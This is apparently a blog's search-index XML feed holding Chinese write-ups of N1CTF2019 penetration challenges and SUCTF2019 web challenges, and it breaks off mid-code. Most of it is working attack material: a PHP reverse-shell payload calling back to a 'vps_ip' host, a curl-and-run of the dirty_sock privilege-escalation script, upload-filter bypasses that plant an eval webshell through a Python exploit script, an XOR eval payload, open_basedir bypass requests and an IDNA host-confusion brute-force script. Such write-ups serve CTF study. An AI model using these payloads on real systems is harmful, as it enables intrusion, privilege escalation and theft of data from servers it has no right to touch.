<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>N1CTF2019渗透题题解</title>
      <link href="/2019/09/08/N1CTF2019%E6%B8%97%E9%80%8F%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
      <url>/2019/09/08/N1CTF2019%E6%B8%97%E9%80%8F%E9%A2%98%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Pentest-N1ctf2019-lab-step1"><a href="#Pentest-N1ctf2019-lab-step1" class="headerlink" title="Pentest N1ctf2019.lab(step1)"></a>Pentest N1ctf2019.lab(step1)</h2><p>链接：<a href="http://47.52.129.242/" target="_blank" rel="noopener">http://47.52.129.242/</a><br>web页面啥也没有，用nmap扫一波</p><pre class=" language-sh"><code class="language-sh">nmap -sS -P0 -T4 47.52.129.242 -vv</code></pre><p>扫描结果</p><pre><code>PORT   STATE SERVICE REASON21/tcp open  ftp     syn-ack ttl 12822/tcp open  ssh     syn-ack ttl 12880/tcp open  http    syn-ack ttl 128</code></pre><p>发现开放了<code>22</code>，<code>21</code>，<code>80</code>端口，猜测入口点应该是在<code>ftp</code>服务，发现可以匿名登陆</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908105616-3993ed62-d1e4-1.png" alt="image.png"></p><p>用<code>nmap</code>扫描一下版本</p><pre><code>nmap -sV -P0 -p 21 47.52.129.242 -vv</code></pre><p>扫描结果如下</p><pre><code>PORT   STATE SERVICE REASON          VERSION21/tcp open  ftp     syn-ack ttl 128 ProFTPD 1.3.5rc3Service Info: OS: Unix</code></pre><p>用msf找一下有没有<code>ProFTPD</code>这个版本的洞，发现有一个文件复制漏洞<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908110708-be5654a8-d1e5-1.png" alt="image.png"></p><p>尝试一波，发现可以写入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908111907-6b556a8a-d1e7-1.png" alt="image.png"></p><p>访问一下看看</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908112355-16d4c040-d1e8-1.png" alt="image.png"></p><p>为了方便操作，我们弹个shell回来</p><pre><code>/qiyou.php?enjoy~=$sock+%3d+fsockopen("vps_ip",+6666)%3b$descriptorspec+%3d+array(0+%3d&gt;+$sock,1+%3d&gt;+$sock,2+%3d&gt;+$sock)%3b$process+%3d+proc_open('/bin/sh',+$descriptorspec,+$pipes)%3bproc_close($process)%3b</code></pre><p>根据题目提示，flag在<code>/root/flag.txt</code>里面，但是发现没有权限</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908112800-a8789b2a-d1e8-1.png" alt="image.png"></p><p>根据题目提示<code>snap</code>，猜测可能是要用<code>snap</code>提权，google一下这个版本的<code>snap</code>发现可以提权，直接用github上的脚本提权：<a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py" target="_blank" rel="noopener">链接</a><br>然后执行一波</p><pre><code>curl -O https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py &amp;&amp; python3 dirty_sockv2.py</code></pre><p>执行成功后会创建一个<code>dirty_sock</code>用户，密码也为<code>dirty_sock</code>。然后我们ssh连上去（php反弹shell的不能直接用su）就可以提权了</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908153206-c27b1bfc-d20a-1.png" alt="image.png"></p><p>然后就是getflag了</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908153322-ef9cec78-d20a-1.png" alt="image.png"></p><h2 id="Pentest-N1ctf2019-lab-step2"><a href="#Pentest-N1ctf2019-lab-step2" class="headerlink" title="Pentest N1ctf2019.lab(step2)"></a>Pentest N1ctf2019.lab(step2)</h2><p>第一步渗透完了，猜测第二个flag应该是在内网的其它机器上面，我们用nmap扫描一下C段</p><pre><code>nmap -p 80 -sS -T4 10.0.0.85/24</code></pre><p>发现内网的一个<code>10.0.0.88</code>开放80端口</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908160618-89bf4752-d20f-1.png" alt="image.png"></p><p>为了方便操作，我们用<code>lcx</code>把内网的<code>10.0.0.88</code>的80端口转发出来</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908165332-22a1c138-d216-1.png" alt="image.png"></p><p>查看源码发现有任意文件读取</p><pre><code>readfile.php?path=img/kerberos.jpg</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908164857-7eaeff82-d215-1.png" alt="image.png"></p><p>未完，带补充</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-WEB-WP</title>
      <link href="/2019/08/20/SUCTF2019-WEB-WP/"/>
      <url>/2019/08/20/SUCTF2019-WEB-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>正逢暑假的闲暇之余，和De1ta的师傅们打了一下<code>suctf2019</code>，下面记录一下web的题解</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>简单地看一下它过滤，大概有3个点：</p><ol><li>不能上传<code>ph</code>结尾的文件，</li><li>上传的文件内容不能有<code>&lt;?</code>，</li><li>用<code>exif_imagetype</code>函数检测上传文件是否为图片文件</li></ol><p>第一反应是上传一个<code>.htaccess</code>，把其它文件格式解析为php文件，但是发现并不行，应该是apache的<code>AllowOverride</code>为<code>None</code>，所以只能另寻他路了，这里卡了很久，回头看一下群发现队里的师傅已经解出来了，告诉我用<code>.user.ini</code>文件，关于<code>.user.ini</code>文档是这么描述的：</p><pre><code>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</code></pre><p>那么我们的思路就很清晰了，把具有<code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置写入<code>.user.ini</code>文件，然后等待<code>user_ini.cache_ttl</code>时间过后他会自动读取用户的<code>ini</code>文件，现在问题修改什么配置，参考了<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" title="这篇文章" target="_blank" rel="noopener">这篇文章</a>，发现<code>auto_prepend_file=file</code>可以，<code>auto_prepend_file</code>大致意思是在执行文件之前包含它的值，那么思路就很清晰了，我们先上传一个<code>.user.ini</code>文件，然后再上传一个webshell上去，最后访问一个php文件去自动包含我们的webshell，很巧目录之下刚好有一个<code>index.php</code>文件。</p><p>过滤<code>&lt;?</code>的话我们可以用<code>&lt;script language="php"&gt;&lt;script&gt;</code>绕过，图片检测我可以随便加一个图片文件头或者是加上<code>#define xlogo_width 200 \n#define xlogo_height 200</code>即可绕过<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819205358-68c01f34-c280-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819205512-95277afe-c280-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819210604-19b8358c-c282-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819210629-28d68316-c282-1.png" alt="image.png"></p><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>题目源码如下：</p><pre class=" language-php"><code class="language-php"><span class="token number">66666</span> <span class="token number">66666</span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// webadmin will remove your upload file every 20 min!!!!</span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这题考察了php的复杂变量，但是做题时候一直没有get到这个点，我太难了，一直用类似这样的payload：<code>(x^x)</code>，<code>((x)^(x))</code>走了弯路，发现并没有解析。最后泽君师傅get到点了<br>payload为：</p><pre><code>?_=${%A0%B8%BA%AB^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag</code></pre><p>PS：<code>$_GET[0xff]</code>可以用<code>$_GET{0xff}</code>代替，正则绕过了，现在想办法上传文件，和<code>CheckIn</code>差不多，高兴的是这题的<code>.htaccess</code>文件可以用，难受的是之前<code>&lt;script language="php"&gt;</code>用不了，于是找到了<a href="https://thibaudrobin.github.io/articles/bypass-filter-upload/" title="这篇文章" target="_blank" rel="noopener">这篇文章</a>，改一下作者的脚本就行了</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsSIZE_HEADER <span class="token operator">=</span> b<span class="token string">"\n\n#define width 1337\n#define height 1337\n\n"</span><span class="token keyword">def</span> <span class="token function">generate_php_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> script<span class="token punctuation">)</span><span class="token punctuation">:</span>    phpfile <span class="token operator">=</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>    phpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>script<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16be'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    phpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>SIZE_HEADER<span class="token punctuation">)</span>    phpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_htacess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    htaccess <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>    htaccess<span class="token punctuation">.</span>write<span class="token punctuation">(</span>SIZE_HEADER<span class="token punctuation">)</span>    htaccess<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">'AddType application/x-httpd-php .xxx\n'</span><span class="token punctuation">)</span>    htaccess<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">'php_value zend.multibyte 1\n'</span><span class="token punctuation">)</span>    htaccess<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">'php_value zend.detect_unicode 1\n'</span><span class="token punctuation">)</span>    htaccess<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">'php_value display_errors 1\n'</span><span class="token punctuation">)</span>    htaccess<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">'http://47.111.59.243:9001/?_=${%a0%B8%BA%AB^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag'</span>    filename<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">".htaccess"</span><span class="token punctuation">,</span><span class="token string">"1.xxx"</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> filename<span class="token punctuation">:</span>        file<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span>open<span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    generate_htacess<span class="token punctuation">(</span><span class="token punctuation">)</span>    generate_php_file<span class="token punctuation">(</span><span class="token string">"1.xxx"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php eval($_GET['cmd']); die(); ?>"</span><span class="token punctuation">)</span>    upload<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>上传一波</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190820100243-9930e8f6-c2ee-1.png" alt="image.png"></p><p>访问一下</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190820095741-e4df5fc2-c2ed-1.png" alt="image.png"></p><p>扫描根目录发现不行，发现有<code>open_basedir</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190820095916-1da3e936-c2ee-1.png" alt="image.png"></p><p>然后就是常规套路绕过了</p><pre><code>http://47.111.59.243:9001/upload/tmp_7d636cd22c795a0d9c176a4c99451654/1.xxx?cmd=chdir(%27tmp%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(%22/%22));</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190820100139-72ff86d8-c2ee-1.png" alt="image.png"></p><p>得到flag</p><pre><code>http://47.111.59.243:9001/upload/tmp_7d636cd22c795a0d9c176a4c99451654/1.xxx?cmd=chdir(%27tmp%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);readfile(%22/THis_Is_tHe_F14g%22);</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190820100356-c430b3f6-c2ee-1.png" alt="image.png"></p><h2 id="pythonnginx"><a href="#pythonnginx" class="headerlink" title="pythonnginx"></a>pythonnginx</h2><p>这题拿了一个一血还行=。=<br>题目很简单明了，直接是用<code>blackhat</code>议题之一<code>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</code>，其中关于python的如下图，具体PPT链接如下：<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" title="PPT链接" target="_blank" rel="noopener">PPT链接</a>，我就不细说了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819094905-86e3f344-c223-1.png" alt="image.png"></p><p>我们可以简单的写一个脚本来爆破一下最后一个字符串<code>c</code>，脚本如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span>urlunsplit<span class="token punctuation">,</span>urlsplit<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">def</span> <span class="token function">get_unicode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        uni<span class="token operator">=</span>chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        url<span class="token operator">=</span><span class="token string">"http://suctf.c{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>uni<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> getUrl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str: "</span><span class="token operator">+</span>uni<span class="token operator">+</span><span class="token string">' unicode: \\u'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> url    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    parts <span class="token operator">=</span> list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    get_unicode<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果如下，随便拿一个字符就行</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819094341-c5f6b31a-c222-1.png" alt="image.png"></p><p>根据题目提示<code>Dont worry about the suctf.cc. Go on!</code>猜测应该是hosts文件<code>suctf.cc</code>绑定了<code>127.0.0.1</code>，既然是<code>127.0.0.1</code>我们可以尝试用file协议读一下文件</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819095833-d9815172-c224-1.png" alt="image.png"></p><p>成功读取，那么现在就是找flag了，根据提示猜测flag位置可能和nginx有关，尝试读一下nginx的配置文件</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100036-22a88f0a-c225-1.png" alt="image.png"><br>得到flag<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100100-31587ea2-c225-1.png" alt="image.png"></p><h2 id="Upload-labs-2"><a href="#Upload-labs-2" class="headerlink" title="Upload labs 2"></a>Upload labs 2</h2><blockquote><p>这题比赛的时候没(bu)看(hui)，现在懒得复现了，这里直接贴上队友的wp了</p></blockquote><p>这道题开放了不久，给了源码，接着审计一波,index.php上传这里没啥限制，限制了文件后缀</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#index.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span><span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"upload"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 允许上传的图片后缀</span>    <span class="token variable">$allowedExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span> <span class="token string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token 